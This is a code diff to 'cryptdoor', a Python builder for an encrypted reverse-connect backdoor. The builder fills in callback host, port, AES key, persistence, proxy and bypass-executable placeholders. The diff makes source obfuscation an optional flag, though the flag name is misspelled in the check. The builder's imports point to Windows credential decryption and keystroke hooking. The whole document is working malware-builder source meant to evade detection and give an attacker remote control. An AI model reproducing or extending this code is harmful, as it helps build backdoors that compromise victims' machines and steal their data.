@@ -26,6 +26,7 @@ def randVar():
 parser = argparse.ArgumentParser(prog='cryptdoor', usage='./cryptdoor.py [options]')
 parser.add_argument('-i', "--hostname", type=str, help='Ip or hostname to connect back to.')
 parser.add_argument("-p", "--port", type=str, help="Port.")
+parser.add_argument('-o', "--obfuscate", action="store_true", help='Enable Obfuscation of source code.')
 parser.add_argument('-a', "--persistence", action="store_true", help='Enable Auto-persistence.')
 parser.add_argument('-x', "--proxy", action="store_true", help='Enable HTTP proxy connect.')
 parser.add_argument('-b', "--backdoorname", type=str, help='Name of backdoor (default backdoor.py).')
@@ -88,26 +89,26 @@ with open('base64/64', 'rb') as exe64:
 with open('stubs/backdoor.py', 'rb') as finalbackdoor:
 	readyscript = finalbackdoor.read().replace('**n', '\\n').replace('***HOST***', hostname).replace('***PORT***', portnumber).replace('***SECRET***', secretkey).replace('**r', '\\r').replace('***PERSIST***', persistpart).replace('***AES***', AESvar).replace('***B64D***',bd64var).replace('***B64E***',be64var).replace('***PROXY***', proxysetting).replace('***WINSERVICES***', lswinservices).replace('***JUNK***', junk).replace('***64EXE***', bypass64).replace('***86EXE***', bypass86).replace('***JUNK2***', junk2)
 
+if args.obsfuscate:
+	with open('tempobfs.py', 'wb') as o:
+		o.write(readyscript)
+	obstime = subprocess.Popen('python pyobfuscate.py -s %s tempobfs.py' % (''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(25,80)))), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+	readyscript = obstime.stdout.read()
+	os.remove('tempobfs.py')
+
+cipher = AES.new(key)
+encrypted = EncodeAES(cipher, readyscript)
+
 myimports = ['subprocess', 'platform', 'socket', 'os', 'struct', 'urllib2', 'binascii', 'ctypes', 'threading', 'string', 'sqlite3', 'requests']
 myendings = ['from Crypto import Random', 'from Crypto.Cipher import AES as %s' % (AESvar), 'from base64 import b64decode as %s' % (bd64var), 'from base64 import b64encode as %s' % (be64var)]
 mywindows = ['win32crypt', 'pyHook', 'pythoncom', 'win32api', 'win32gui', 'win32ui', 'win32con']
 
 if args.proxy:
 	mywindows.append('socks')
-
+	
 random.shuffle(myimports)
 random.shuffle(myendings)
 random.shuffle(mywindows)
-
-with open('tempobfs.py', 'wb') as o:
-	o.write(readyscript)
-
-obstime = subprocess.Popen('python pyobfuscate.py -s %s tempobfs.py' % (''.join(random.choice(string.ascii_letters + string.digits) for x in range(random.randint(25,80)))), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-readyscript = obstime.stdout.read()
-os.remove('tempobfs.py')
-
-cipher = AES.new(key)
-encrypted = EncodeAES(cipher, readyscript)
 
 with open(backdoorName, 'w') as f:
 	f.write('#!/usr/bin/env python\nimport ')
